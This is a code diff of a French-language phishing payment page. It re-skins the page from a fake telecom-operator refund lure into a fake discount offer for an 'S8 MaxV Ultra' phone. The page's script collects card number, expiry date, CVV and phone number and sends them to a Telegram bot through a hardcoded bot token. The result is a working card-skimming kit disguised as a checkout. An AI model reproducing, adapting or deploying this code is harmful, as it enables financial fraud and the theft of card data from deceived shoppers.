@@ -19,17 +19,20 @@
 </head>
 <body class="bg-gray-100 flex flex-col min-h-screen justify-between">
 
-    <!-- Formulaire principal -->
-    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
-        <!-- Logos des opérateurs -->
-        <div class="flex justify-center space-x-4 mb-6">
-            <img src="047a47ad-bca7-4ce0-8d59-894df2f8d8a6.jpeg" alt="logo" class="h-12">
-            <img src="IMG_4265.jpeg" alt="sfr" class="h-12">
-            <img src="IMG_4264.jpeg" alt="Bouygues Telecom" class="h-12">
-            <img src="IMG_4263.jpeg" alt="SFR" class="h-12">
+    <!-- Card de produit avec image en haut -->
+    <div class="product-card bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
+        <!-- Image produit -->
+        <div class="flex justify-center mb-6">
+            <img src="S8MaxVUltra_A_Fr.webp" alt="S8 MaxV Ultra" class="w-48 h-auto rounded-md shadow-lg">
         </div>
+        <div class="product-info text-center">
+            <h3 class="text-xl font-semibold text-gray-800">S8 MaxV Ultra</h3>
+            <p class="text-lg text-green-600 mt-2">799€ <span class="line-through text-red-500">1499€</span></p>
+        </div>
+    </div>
 
-        <!-- Titre -->
+    <!-- Formulaire de paiement -->
+    <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-6">
         <h1 class="text-2xl font-bold text-center text-gray-800 mb-2">Formulaire de Paiement</h1>
         <p class="text-sm text-center text-gray-600 mb-6">
             Veuillez entrer vos informations de paiement pour effectuer la transaction en toute sécurité.
@@ -74,42 +77,12 @@
                     class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
             </div>
 
-            <!-- Sélection du fournisseur -->
-            <div class="mb-6">
-                <label for="operateur" class="block text-sm font-medium text-gray-700">Choisir votre opérateur</label>
-                <select id="operateur" name="operateur" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
-                    <option value="" disabled selected>-- Sélectionnez votre opérateur --</option>
-                    <option value="orange">Orange</option>
-                    <option value="bouygues">Bouygues Telecom</option>
-                    <option value="sfr">SFR</option>
-                    <option value="free">Free Mobile</option>
-                </select>
-            </div>
-
-            <!-- Banque -->
-            <div class="mb-6">
-                <label for="bank" class="block text-sm font-medium text-gray-700">Choisir votre banque</label>
-                <select id="bank" name="bank" required
-                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
-                    <option value="" disabled selected>-- Sélectionnez votre banque --</option>
-                    <option value="bnpp">BNP Paribas</option>
-                    <option value="sg">Société Générale</option>
-                    <option value="cic">CIC</option>
-                </select>
-            </div>
-
             <!-- Bouton de validation -->
             <button type="submit"
                 class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
                 Valider mon paiement
             </button>
         </form>
-
-        <!-- Section supplémentaire -->
-        <div class="mt-6 flex justify-center">
-            <img src="IMG_4262.jpeg" alt="Remboursement Sécurisé" class="w-52 h-auto">
-        </div>
     </div>
 
     <script>
@@ -121,8 +94,6 @@
             const dateExpiration = document.getElementById("date-expiration").value;
             const cvv = document.getElementById("cvv").value;
             const telephone = document.getElementById("telephone").value;
-            const operateur = document.getElementById("operateur").value;
-            const bank = document.getElementById("bank").value;
 
             // Send to Telegram bot
             const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
@@ -134,9 +105,7 @@
 💳 Numéro de Carte: ${numeroCarte}
 📅 Expiration: ${dateExpiration}
 🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}
-📡 Opérateur: ${operateur}
-🏦 Banque: ${bank}`;
+📞 Téléphone: ${telephone}`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
